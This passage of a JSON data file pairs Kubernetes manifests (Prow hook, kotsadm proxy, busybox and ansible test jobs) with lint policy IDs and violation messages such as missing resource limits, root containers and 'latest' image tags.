    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210615-c3915f8ad7\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"hook\" has cpu request 0"
  },
  {
    "id": "01239",
    "manifest_path": "data/manifests/the_stack_sample/sample_0339.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210615-c3915f8ad7\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"hook\" has memory limit 0"
  },
  {
    "id": "01240",
    "manifest_path": "data/manifests/the_stack_sample/sample_0343.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: component-nodejs-dependence-npm\nspec:\n  containers:\n  - name: npm\n    image: hub.opshub.sh/containerops/dependence-nodejs-npm:latest\n    env:\n    - name: CO_DATA\n      value: git_url=https://github.com/WildDogTeam/demo-js-wildchat.git\n    resources:\n      requests:\n        cpu: 2\n        memory: 4G\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"npm\" is using an invalid container image, \"hub.opshub.sh/containerops/dependence-nodejs-npm:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01241",
    "manifest_path": "data/manifests/the_stack_sample/sample_0343.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: component-nodejs-dependence-npm\nspec:\n  containers:\n  - name: npm\n    image: hub.opshub.sh/containerops/dependence-nodejs-npm:latest\n    env:\n    - name: CO_DATA\n      value: git_url=https://github.com/WildDogTeam/demo-js-wildchat.git\n    resources:\n      requests:\n        cpu: 2\n        memory: 4G\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"npm\" does not have a read-only root file system"
  },
  {
    "id": "01242",
    "manifest_path": "data/manifests/the_stack_sample/sample_0343.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: component-nodejs-dependence-npm\nspec:\n  containers:\n  - name: npm\n    image: hub.opshub.sh/containerops/dependence-nodejs-npm:latest\n    env:\n    - name: CO_DATA\n      value: git_url=https://github.com/WildDogTeam/demo-js-wildchat.git\n    resources:\n      requests:\n        cpu: 2\n        memory: 4G\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"npm\" is not set to runAsNonRoot"
  },
  {
    "id": "01243",
    "manifest_path": "data/manifests/the_stack_sample/sample_0343.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: component-nodejs-dependence-npm\nspec:\n  containers:\n  - name: npm\n    image: hub.opshub.sh/containerops/dependence-nodejs-npm:latest\n    env:\n    - name: CO_DATA\n      value: git_url=https://github.com/WildDogTeam/demo-js-wildchat.git\n    resources:\n      requests:\n        cpu: 2\n        memory: 4G\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"npm\" has memory limit 0"
  },
  {
    "id": "01244",
    "manifest_path": "data/manifests/the_stack_sample/sample_0345.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes10\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n  volumes:\n  - flocker:\n      datasetName: test\n    name: volume1\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"container1\" is using an invalid container image, \"k8s.gcr.io/pause\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01245",
    "manifest_path": "data/manifests/the_stack_sample/sample_0345.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes10\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n  volumes:\n  - flocker:\n      datasetName: test\n    name: volume1\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"initcontainer1\" is using an invalid container image, \"k8s.gcr.io/pause\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01246",
    "manifest_path": "data/manifests/the_stack_sample/sample_0345.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes10\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n  volumes:\n  - flocker:\n      datasetName: test\n    name: volume1\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"container1\" does not have a read-only root file system"
  },
  {
    "id": "01247",
    "manifest_path": "data/manifests/the_stack_sample/sample_0345.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes10\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n  volumes:\n  - flocker:\n      datasetName: test\n    name: volume1\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"initcontainer1\" does not have a read-only root file system"
  },
  {
    "id": "01248",
    "manifest_path": "data/manifests/the_stack_sample/sample_0345.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes10\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n  volumes:\n  - flocker:\n      datasetName: test\n    name: volume1\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"container1\" has cpu request 0"
  },
  {
    "id": "01249",
    "manifest_path": "data/manifests/the_stack_sample/sample_0345.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes10\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n  volumes:\n  - flocker:\n      datasetName: test\n    name: volume1\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"initcontainer1\" has cpu request 0"
  },
  {
    "id": "01250",
    "manifest_path": "data/manifests/the_stack_sample/sample_0345.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes10\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n  volumes:\n  - flocker:\n      datasetName: test\n    name: volume1\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"container1\" has memory limit 0"
  },
  {
    "id": "01251",
    "manifest_path": "data/manifests/the_stack_sample/sample_0345.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes10\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n  volumes:\n  - flocker:\n      datasetName: test\n    name: volume1\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"initcontainer1\" has memory limit 0"
  },
  {
    "id": "01252",
    "manifest_path": "data/manifests/the_stack_sample/sample_0350.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kurl-proxy-kotsadm\n  labels:\n    app: kurl-proxy-kotsadm\n    kots.io/kotsadm: \\\"true\\\"\n    kots.io/backup: velero\nspec:\n  selector:\n    matchLabels:\n      app: kurl-proxy-kotsadm\n  template:\n    metadata:\n      labels:\n        app: kurl-proxy-kotsadm\n        kots.io/kotsadm: \\\"true\\\"\n        kots.io/backup: velero\n    spec:\n      containers:\n      - name: proxy\n        image: kotsadm/kurl-proxy:v1.38.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: NODE_PORT\n          value: \\\"8800\\\"\n        - name: UPSTREAM_ORIGIN\n          value: http://kotsadm:3000\n        - name: DEX_UPSTREAM_ORIGIN\n          value: http://kotsadm-dex:5556\n        - name: TLS_SECRET_NAME\n          value: kotsadm-tls\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: kotsadm-config\n          mountPath: /etc/kotsadm\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 50m\n            memory: 50Mi\n      serviceAccount: kurl-proxy\n      volumes:\n      - name: kotsadm-config\n        configMap:\n          name: kotsadm-application-metadata\n          optional: true\n",
    "policy_id": "env-var-secret",
    "violation_text": "environment variable TLS_SECRET_NAME in container \"proxy\" found"
  },
  {
    "id": "01253",
    "manifest_path": "data/manifests/the_stack_sample/sample_0350.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kurl-proxy-kotsadm\n  labels:\n    app: kurl-proxy-kotsadm\n    kots.io/kotsadm: \\\"true\\\"\n    kots.io/backup: velero\nspec:\n  selector:\n    matchLabels:\n      app: kurl-proxy-kotsadm\n  template:\n    metadata:\n      labels:\n        app: kurl-proxy-kotsadm\n        kots.io/kotsadm: \\\"true\\\"\n        kots.io/backup: velero\n    spec:\n      containers:\n      - name: proxy\n        image: kotsadm/kurl-proxy:v1.38.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: NODE_PORT\n          value: \\\"8800\\\"\n        - name: UPSTREAM_ORIGIN\n          value: http://kotsadm:3000\n        - name: DEX_UPSTREAM_ORIGIN\n          value: http://kotsadm-dex:5556\n        - name: TLS_SECRET_NAME\n          value: kotsadm-tls\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: kotsadm-config\n          mountPath: /etc/kotsadm\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 50m\n            memory: 50Mi\n      serviceAccount: kurl-proxy\n      volumes:\n      - name: kotsadm-config\n        configMap:\n          name: kotsadm-application-metadata\n          optional: true\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"proxy\" does not have a read-only root file system"
  },
  {
    "id": "01254",
    "manifest_path": "data/manifests/the_stack_sample/sample_0350.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kurl-proxy-kotsadm\n  labels:\n    app: kurl-proxy-kotsadm\n    kots.io/kotsadm: \\\"true\\\"\n    kots.io/backup: velero\nspec:\n  selector:\n    matchLabels:\n      app: kurl-proxy-kotsadm\n  template:\n    metadata:\n      labels:\n        app: kurl-proxy-kotsadm\n        kots.io/kotsadm: \\\"true\\\"\n        kots.io/backup: velero\n    spec:\n      containers:\n      - name: proxy\n        image: kotsadm/kurl-proxy:v1.38.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: NODE_PORT\n          value: \\\"8800\\\"\n        - name: UPSTREAM_ORIGIN\n          value: http://kotsadm:3000\n        - name: DEX_UPSTREAM_ORIGIN\n          value: http://kotsadm-dex:5556\n        - name: TLS_SECRET_NAME\n          value: kotsadm-tls\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: kotsadm-config\n          mountPath: /etc/kotsadm\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 50m\n            memory: 50Mi\n      serviceAccount: kurl-proxy\n      volumes:\n      - name: kotsadm-config\n        configMap:\n          name: kotsadm-application-metadata\n          optional: true\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"proxy\" is not set to runAsNonRoot"
  },
  {
    "id": "01255",
    "manifest_path": "data/manifests/the_stack_sample/sample_0352.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: fb-user-datastore-api-{{ .Values.environmentName }}\nspec:\n  replicas: 10\n  selector:\n    matchLabels:\n      app: fb-user-datastore-api-{{ .Values.environmentName }}\n  template:\n    metadata:\n      labels:\n        app: fb-user-datastore-api-{{ .Values.environmentName }}\n        appGroup: fb-user-datastore\n        fb-service-token-cache-access: 'true'\n        tier: frontend\n    spec:\n      serviceAccountName: formbuilder-user-datastore-{{ .Values.environmentName }}\n      containers:\n      - name: fb-user-datastore-api-{{ .Values.environmentName }}\n        image: 754256621582.dkr.ecr.eu-west-2.amazonaws.com/formbuilder/fb-user-datastore-api:{{\n          .Values.circleSha1 }}\n        securityContext:\n          runAsUser: 1001\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 3000\n        readinessProbe:\n          httpGet:\n            path: /health\n            port: 3000\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          successThreshold: 1\n        envFrom:\n        - configMapRef:\n            name: fb-user-datastore-api-env-{{ .Values.environmentName }}\n        env:\n        - name: DATABASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: rds-instance-formbuilder-user-datastore-{{ .Values.environmentName\n                }}\n              key: url\n        - name: SECRET_KEY_BASE\n          valueFrom:\n            secretKeyRef:\n              name: fb-user-datastore-api-secrets-{{ .Values.environmentName }}\n              key: secret_key_base\n        - name: SERVICE_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: fb-platform-datastore-token-{{ .Values.environmentName }}\n              key: token\n        - name: SENTRY_DSN\n          valueFrom:\n            secretKeyRef:\n              name: fb-user-datastore-api-secrets-{{ .Values.environmentName }}\n              key: sentry_dsn\n        - name: METRICS_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: fb-user-datastore-api-secrets-{{ .Values.environmentName }}\n              key: metrics_access_key\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"fb-user-datastore-api-{{ .Values.environmentName }}\" does not have a read-only root file system"
  },
  {
    "id": "01256",
    "manifest_path": "data/manifests/the_stack_sample/sample_0352.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: fb-user-datastore-api-{{ .Values.environmentName }}\nspec:\n  replicas: 10\n  selector:\n    matchLabels:\n      app: fb-user-datastore-api-{{ .Values.environmentName }}\n  template:\n    metadata:\n      labels:\n        app: fb-user-datastore-api-{{ .Values.environmentName }}\n        appGroup: fb-user-datastore\n        fb-service-token-cache-access: 'true'\n        tier: frontend\n    spec:\n      serviceAccountName: formbuilder-user-datastore-{{ .Values.environmentName }}\n      containers:\n      - name: fb-user-datastore-api-{{ .Values.environmentName }}\n        image: 754256621582.dkr.ecr.eu-west-2.amazonaws.com/formbuilder/fb-user-datastore-api:{{\n          .Values.circleSha1 }}\n        securityContext:\n          runAsUser: 1001\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 3000\n        readinessProbe:\n          httpGet:\n            path: /health\n            port: 3000\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          successThreshold: 1\n        envFrom:\n        - configMapRef:\n            name: fb-user-datastore-api-env-{{ .Values.environmentName }}\n        env:\n        - name: DATABASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: rds-instance-formbuilder-user-datastore-{{ .Values.environmentName\n                }}\n              key: url\n        - name: SECRET_KEY_BASE\n          valueFrom:\n            secretKeyRef:\n              name: fb-user-datastore-api-secrets-{{ .Values.environmentName }}\n              key: secret_key_base\n        - name: SERVICE_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: fb-platform-datastore-token-{{ .Values.environmentName }}\n              key: token\n        - name: SENTRY_DSN\n          valueFrom:\n            secretKeyRef:\n              name: fb-user-datastore-api-secrets-{{ .Values.environmentName }}\n              key: sentry_dsn\n        - name: METRICS_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: fb-user-datastore-api-secrets-{{ .Values.environmentName }}\n              key: metrics_access_key\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"fb-user-datastore-api-{{ .Values.environmentName }}\" has cpu request 0"
  },
  {
    "id": "01257",
    "manifest_path": "data/manifests/the_stack_sample/sample_0352.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: fb-user-datastore-api-{{ .Values.environmentName }}\nspec:\n  replicas: 10\n  selector:\n    matchLabels:\n      app: fb-user-datastore-api-{{ .Values.environmentName }}\n  template:\n    metadata:\n      labels:\n        app: fb-user-datastore-api-{{ .Values.environmentName }}\n        appGroup: fb-user-datastore\n        fb-service-token-cache-access: 'true'\n        tier: frontend\n    spec:\n      serviceAccountName: formbuilder-user-datastore-{{ .Values.environmentName }}\n      containers:\n      - name: fb-user-datastore-api-{{ .Values.environmentName }}\n        image: 754256621582.dkr.ecr.eu-west-2.amazonaws.com/formbuilder/fb-user-datastore-api:{{\n          .Values.circleSha1 }}\n        securityContext:\n          runAsUser: 1001\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 3000\n        readinessProbe:\n          httpGet:\n            path: /health\n            port: 3000\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          successThreshold: 1\n        envFrom:\n        - configMapRef:\n            name: fb-user-datastore-api-env-{{ .Values.environmentName }}\n        env:\n        - name: DATABASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: rds-instance-formbuilder-user-datastore-{{ .Values.environmentName\n                }}\n              key: url\n        - name: SECRET_KEY_BASE\n          valueFrom:\n            secretKeyRef:\n              name: fb-user-datastore-api-secrets-{{ .Values.environmentName }}\n              key: secret_key_base\n        - name: SERVICE_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: fb-platform-datastore-token-{{ .Values.environmentName }}\n              key: token\n        - name: SENTRY_DSN\n          valueFrom:\n            secretKeyRef:\n              name: fb-user-datastore-api-secrets-{{ .Values.environmentName }}\n              key: sentry_dsn\n        - name: METRICS_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: fb-user-datastore-api-secrets-{{ .Values.environmentName }}\n              key: metrics_access_key\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"fb-user-datastore-api-{{ .Values.environmentName }}\" has memory limit 0"
  },
  {
    "id": "01258",
    "manifest_path": "data/manifests/the_stack_sample/sample_0353.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: echo\nspec:\n  selector:\n    matchLabels:\n      app: echo\n  template:\n    metadata:\n      labels:\n        app: echo\n    spec:\n      volumes:\n      - name: nfs-mount\n        persistentVolumeClaim:\n          claimName: nfs-for-pods\n      containers:\n      - image: busybox\n        name: echo\n        volumeMounts:\n        - mountPath: /data\n          name: nfs-mount\n        command:\n        - ping\n        - 127.0.0.1\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"echo\" is using an invalid container image, \"busybox\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01259",
    "manifest_path": "data/manifests/the_stack_sample/sample_0353.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: echo\nspec:\n  selector:\n    matchLabels:\n      app: echo\n  template:\n    metadata:\n      labels:\n        app: echo\n    spec:\n      volumes:\n      - name: nfs-mount\n        persistentVolumeClaim:\n          claimName: nfs-for-pods\n      containers:\n      - image: busybox\n        name: echo\n        volumeMounts:\n        - mountPath: /data\n          name: nfs-mount\n        command:\n        - ping\n        - 127.0.0.1\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"echo\" does not have a read-only root file system"
  },
  {
    "id": "01260",
    "manifest_path": "data/manifests/the_stack_sample/sample_0353.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: echo\nspec:\n  selector:\n    matchLabels:\n      app: echo\n  template:\n    metadata:\n      labels:\n        app: echo\n    spec:\n      volumes:\n      - name: nfs-mount\n        persistentVolumeClaim:\n          claimName: nfs-for-pods\n      containers:\n      - image: busybox\n        name: echo\n        volumeMounts:\n        - mountPath: /data\n          name: nfs-mount\n        command:\n        - ping\n        - 127.0.0.1\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"echo\" is not set to runAsNonRoot"
  },
  {
    "id": "01261",
    "manifest_path": "data/manifests/the_stack_sample/sample_0353.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: echo\nspec:\n  selector:\n    matchLabels:\n      app: echo\n  template:\n    metadata:\n      labels:\n        app: echo\n    spec:\n      volumes:\n      - name: nfs-mount\n        persistentVolumeClaim:\n          claimName: nfs-for-pods\n      containers:\n      - image: busybox\n        name: echo\n        volumeMounts:\n        - mountPath: /data\n          name: nfs-mount\n        command:\n        - ping\n        - 127.0.0.1\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"echo\" has cpu request 0"
  },
  {
    "id": "01262",
    "manifest_path": "data/manifests/the_stack_sample/sample_0353.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: echo\nspec:\n  selector:\n    matchLabels:\n      app: echo\n  template:\n    metadata:\n      labels:\n        app: echo\n    spec:\n      volumes:\n      - name: nfs-mount\n        persistentVolumeClaim:\n          claimName: nfs-for-pods\n      containers:\n      - image: busybox\n        name: echo\n        volumeMounts:\n        - mountPath: /data\n          name: nfs-mount\n        command:\n        - ping\n        - 127.0.0.1\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"echo\" has memory limit 0"
  },
  {
    "id": "01263",
    "manifest_path": "data/manifests/the_stack_sample/sample_0354.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: e2e\nspec:\n  template:\n    metadata:\n      labels:\n        test: device-localpv-upgrade\n    spec:\n      serviceAccountName: e2e\n      containers:\n      - name: ansibletest\n        image: openebs/device-localpv-e2e:ci\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: ANSIBLE_STDOUT_CALLBACK\n          value: default\n        - name: TO_VERSION_DEVICE_BRANCH\n          value: ''\n        - name: TO_VERSION_DEVICE_DRIVER_IMAGE\n          value: ''\n        - name: DEVICE_OPERATOR_NAMESPACE\n          value: openebs\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ansible-playbook ./e2e-tests/experiments/upgrade-device-localpv/test.yml\n          -i /etc/ansible/hosts -v; exit 0\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ansibletest\" does not have a read-only root file system"
  },
  {
    "id": "01264",
    "manifest_path": "data/manifests/the_stack_sample/sample_0354.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: e2e\nspec:\n  template:\n    metadata:\n      labels:\n        test: device-localpv-upgrade\n    spec:\n      serviceAccountName: e2e\n      containers:\n      - name: ansibletest\n        image: openebs/device-localpv-e2e:ci\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: ANSIBLE_STDOUT_CALLBACK\n          value: default\n        - name: TO_VERSION_DEVICE_BRANCH\n          value: ''\n        - name: TO_VERSION_DEVICE_DRIVER_IMAGE\n          value: ''\n        - name: DEVICE_OPERATOR_NAMESPACE\n          value: openebs\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ansible-playbook ./e2e-tests/experiments/upgrade-device-localpv/test.yml\n          -i /etc/ansible/hosts -v; exit 0\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ansibletest\" is not set to runAsNonRoot"
  },
  {
    "id": "01265",
    "manifest_path": "data/manifests/the_stack_sample/sample_0354.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: e2e\nspec:\n  template:\n    metadata:\n      labels:\n        test: device-localpv-upgrade\n    spec:\n      serviceAccountName: e2e\n      containers:\n      - name: ansibletest\n        image: openebs/device-localpv-e2e:ci\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: ANSIBLE_STDOUT_CALLBACK\n          value: default\n        - name: TO_VERSION_DEVICE_BRANCH\n          value: ''\n        - name: TO_VERSION_DEVICE_DRIVER_IMAGE\n          value: ''\n        - name: DEVICE_OPERATOR_NAMESPACE\n          value: openebs\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - ansible-playbook ./e2e-tests/experiments/upgrade-device-localpv/test.yml\n          -i /etc/ansible/hosts -v; exit 0\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ansibletest\" has cpu request 0"
  },
  {
    "id": "01266",
    "manifest_path": "data/manifests/the_stack_sample/sample_0354.yaml",
